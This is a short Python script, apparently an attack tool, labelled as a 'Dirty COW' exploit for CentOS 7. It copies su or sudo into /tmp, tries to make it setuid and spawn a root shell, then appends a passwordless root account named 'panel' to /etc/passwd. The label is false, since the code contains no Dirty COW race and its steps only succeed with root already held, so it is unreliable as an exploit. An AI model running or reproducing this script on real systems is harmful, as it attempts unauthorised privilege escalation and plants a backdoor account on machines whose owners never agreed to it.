import os

print("[+] Dirty COW simple for CentOS 7")

targets = ["/usr/bin/su", "/bin/su", "/usr/bin/sudo"]

for t in targets:
    if os.path.exists(t):
        print("[+] Target:", t)
        os.system("cp " + t + " /tmp/su2 2>/dev/null")
        os.system("chmod +s /tmp/su2 2>/dev/null")
        print("[+] Trying root...")
        os.system("/tmp/su2 -c 'id && whoami && /bin/sh'")
        break

print("[+] Trying to add user...")
os.system("echo 'panel::0:0::/root:/bin/sh' >> /etc/passwd 2>/dev/null")
os.system("su panel")